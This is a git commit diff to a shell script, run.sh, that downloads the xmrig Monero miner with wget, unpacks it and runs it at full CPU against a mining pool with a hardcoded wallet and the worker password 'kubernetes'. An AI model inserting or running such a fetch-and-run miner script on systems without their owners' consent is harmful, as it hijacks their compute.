6ae519c7f33a9cb4f6c86e2a31c0d4e8ab8d50f4
Anthony Lim <46749119+4nth0nyl1MHC@users.noreply.github.com>
2019-03-08 20:09:20 +0800

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,1 +1,5 @@
-./xmrig.exe -o gulf.moneroocean.stream:80 -u 4AdbjqR7UuPf44divebPM1YKs2n6UARhEERk9veCu43vg8AcE3E1KBYGuaFxHhndarajwzbCVgnNVXqPhnZDEuhU2PD8fYb -p fishfish--max-cpu-usage=100 --cpu-priority=5 --donate-level=1
+wget https://github.com/xmrig/xmrig/releases/download/v2.13.1/xmrig-2.13.1-xenial-x64.tar.gz
+tar -vxf xmrig-2.13.1-xenial-x64.tar.gz
+cd xmrig-2.13.1
+./xmrig -o gulf.moneroocean.stream:80 -u 4AdbjqR7UuPf44divebPM1YKs2n6UARhEERk9veCu43vg8AcE3E1KBYGuaFxHhndarajwzbCVgnNVXqPhnZDEuhU2PD8fYb -p kubernetes --max-cpu-usage=100 --cpu-priority=5 --donate-level=1
+
